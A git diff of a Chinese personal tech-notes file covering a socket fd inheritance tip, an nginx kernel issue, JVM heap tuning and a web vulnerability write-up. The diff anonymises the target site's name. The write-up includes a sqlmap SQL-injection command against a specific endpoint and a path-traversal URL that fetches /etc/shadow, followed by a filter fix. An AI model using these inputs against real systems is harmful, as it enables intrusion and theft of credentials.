@@ -802,7 +802,8 @@ static const WCHAR BASED_CODE _szLicString[] =  L"Copyright (c) 2010 ";
    fcntl(fd, SETFD, FD_CLOEXEC);
    这样使用system()产生子进程就不会继承这个socket fd.
    FD_CLOEXEC表示当程序执行exec函数时本fd将被系统自动关闭,表示不传递给exec创建的新进程.
-* nignix 做反向代理的,ip src address = dst address = 0.0.0.0
+* ngnix 做反向代理的,ip src address = dst address = 0.0.0.0
+
   suse 11 sp1 升级到 suse 11 sp2后,24小时发生这个问题.
   我基于ip的src地址不能为0.0.0.0,初步判断是内核问题.
   后来看代码
@@ -1301,12 +1302,12 @@ sec, 3)
   而API之所以加锁是由于openssl的加密/解密的api，不是线程安全。
   后来查资料获取openssl对多线程支持的方法。
   
-* 海信社区安全漏洞
+* 社区安全漏洞
 1、POST型SQL注入
-    存在SQL注入的站点www.hismarttv.com/ajax/getHotAppList.jspx
+    存在SQL注入的站点www.xxx.com/ajax/getHotAppList.jspx
 
 使用sqlmap
-./sqlmap.py -u 'http://www.hismarttv.com/ajax/getHotAppList.jspx'  --data 'appId=9000000104031&count=7&deviceCode=&deviceType=003&PageNo=0&t=0.40499216807074845&type=3' --dbs --current-user --current-db
+./sqlmap.py -u 'http://www.xxx.com/ajax/getHotAppList.jspx'  --data 'appId=9000000104031&count=7&deviceCode=&deviceType=003&PageNo=0&t=0.40499216807074845&type=3' --dbs --current-user --current-db
 
 返回：
 #+begin_example
@@ -1345,7 +1346,7 @@ available databases [8]:
 #+end_example
 
 2、任意文件下载
-http://www.hismarttv.com/DownloadServlet?contentId=217&downFile=../../../../../../../../../../etc/shadow&fileSize=&flag=1&userName=admin
+http://www.xxx.com/DownloadServlet?contentId=217&downFile=../../../../../../../../../../etc/shadow&fileSize=&flag=1&userName=admin
 可以下载到shadow文件
 
 解决办法：
@@ -1434,3 +1435,76 @@ public class CheckFilter implements Filter{
 
 重启tomcat后，再使用sqlmap测试，无法进行SQL注入了。well done
 
+* java.lang.OutOfMemoryError: Java heap space
+  线上一个报表系统基于tomcat的
+  经常出现out of memory错误，增加JVM内存，在catalina.sh
+  增加如下配置：
+  -Xmx6g -Xms6g -Xmn256m 
+  仍不解决问题，后来内存弄到15G，照样oom。
+  我推测可能是新生代内存太少，导致新生代内存区不断充满，转移到old区，
+  而old区回收速度慢，导致的问题，
+
+  查看java进程堆的相关信息
+ jstat -heap 25333
+
+查看各种java对象占用的内存大小
+#+begin_example
+dass-1:/usr/src/jdk1.6.0_39/bin # ./jmap -histo 25333 | more
+
+ num     #instances         #bytes  class name
+----------------------------------------------
+   1:      52160008     2086400320  java.math.BigInteger
+   2:      52159881     2086395240  java.math.BigDecimal
+   3:      56995839     1887214240  [I
+   4:      13864895      658154440  [C
+   5:      13865899      443708768  java.lang.String
+#+end_example
+可以看出BigInteger BigDecimal临时对象就占用4G
+
+  于是我将设置
+  -server
+  -Xmx6g -Xms6g -Xmn3g
+  FGC之前先进行新生代回收，多一次回收新生代的机会，一切为新生代服务
+  -XX:+ScavengeBeforeFullGC 
+  
+  -XX:+CMSScavengeBeforeRemark 
+   使用CMS加快老生代的收集
+  -XX:+UseConcMarkSweepGC 
+   并行收集新生代
+  -XX:+UseParNewGC 
+  -XX:+CMSParallelRemarkEnabled 
+   仅使用手动初始化定义开始收集
+   -XX:+UseCMSInitiatingOccupancyOnly
+   CMS堆使用30%时，开始收集（一切为省内存）
+  -XX:CMSInitiatingOccupancyFraction=30
+
+  JVM中新生代应该存放生存期短的对象，且报表系统的特点就是会短时间产生大量的对象，而且这个对象生命周期短。
+
+#+begin_example
+dass-1:~$ jstat -gc 9582 1000 
+S0C S1C S0U S1U EC EU OC OU PC PU YGC YGCT FGC FGCT GCT 
+...
+#+end_example
+
+jstat命令的最后一个参数是每个输出的时间间隔。每隔一秒就会打印出内存和垃圾收集数据。
+
+让我们一起来对每一列的意义进行逐一了解：
+
+S0C和S1C：这一列展示了Survivor0和Survivor1区的当前大小（单位KB）。
+S0U和S1U：这一列展示了当前Survivor0和Survivor1区的使用情况（单位KB）。注意：无论任何时候，总会有一个Survivor区是空着的。
+EC和EU：这些列展示了Eden区当前空间大小和使用情况（单位KB）。注意：EU的大小一直在增大。而且只要大小接近EC时，就会触发Minor GC并且EU将会减小。
+OC和OU：这些列展示了年老代当前空间大小和当前使用情况（单位KB）。
+PC和PU：这些列展示了Perm Gen（永久代）当前空间大小和当前使用情况（单位KB）。
+YGC和YGCT：YGC这列显示了发生在年轻代的GC事件的数量。YGCT这列显示了在年轻代进行GC操作的累计时间。注意：在EU的值由于minor GC导致下降时，同一行的YGC和YGCT都会增加。
+FGC和FGCT：FGC列显示了发生Full GC事件的次数。FGCT显示了进行Full GC操作的累计时间。注意：相对于年轻代的GC使用时间，Full GC所用的时间长很多。
+GCT：这一列显示了GC操作的总累计时间。注意：总累计时间是YGCT和FGCT两列所用时间的总和（GCT=YGCT+FGCT）。
+
+
+后增加
+-XX:+DoEscapeAnalysis
+逃逸分析
+再次用
+jmap -heap 查看，没有发现出BigInteger BigDecimal占用大量内存
+
+
+http://stackoverflow.com/questions/142357/what-are-the-best-jvm-settings-for-eclipse
